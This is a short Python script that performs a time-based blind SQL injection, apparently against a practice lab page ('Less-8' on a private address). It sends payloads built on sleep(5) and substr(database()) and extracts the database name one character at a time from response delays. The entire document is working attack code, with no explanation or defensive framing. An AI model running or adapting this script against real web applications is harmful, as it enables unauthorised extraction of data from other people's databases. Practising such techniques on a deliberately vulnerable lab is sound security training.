#!/usr/bin/python3

import requests, sys, time

url="http://192.168.0.106/Less-8/?id=1"

result=''
s=r'0123456789abcdefghijklmnopqrstuvwxyz'

def check(payload):
	url_new=url+payload
	time_start=time.time()
	content=requests.get(url_new)
	time_end=time.time()

	if time_end-time_start > 5:
		return 1

for i in range(1, 100):
	for c in s:
		payload="' and if(substr(database(),%d,1)='%c', sleep(5),1)-- -" %(i,c)

		if check(payload):
			result+=c
			print(result)
			break

print("\n[*] %s" % result)
